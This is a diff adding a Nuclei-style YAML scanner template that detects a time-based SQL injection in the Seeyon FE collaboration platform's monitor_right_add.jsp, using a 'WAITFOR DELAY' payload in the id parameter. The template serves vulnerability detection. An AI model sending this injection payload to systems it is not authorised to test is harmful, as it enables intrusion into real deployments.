@@ -1,0 +1,50 @@
+id: poc-yaml-seeyon-hulian-fe-monitor-right-add-sqli
+
+info:
+  name: 致远互联FE协作办公平台 monitor_right_add SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "initial-request"
+    method: GET
+    path:
+      - "{{BaseURL}}/system/monitorright/monitor_right_add.jsp?id=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "授权人员"
+          - "请至少授权一个用户角色"
+        condition: or
+        part: body
+
+  - id: "sqli-check"
+    method: GET
+    path:
+      - "{{BaseURL}}/system/monitorright/monitor_right_add.jsp?id=1);WAITFOR+DELAY+%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "点击关闭，重新操作！"
+        condition: or
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
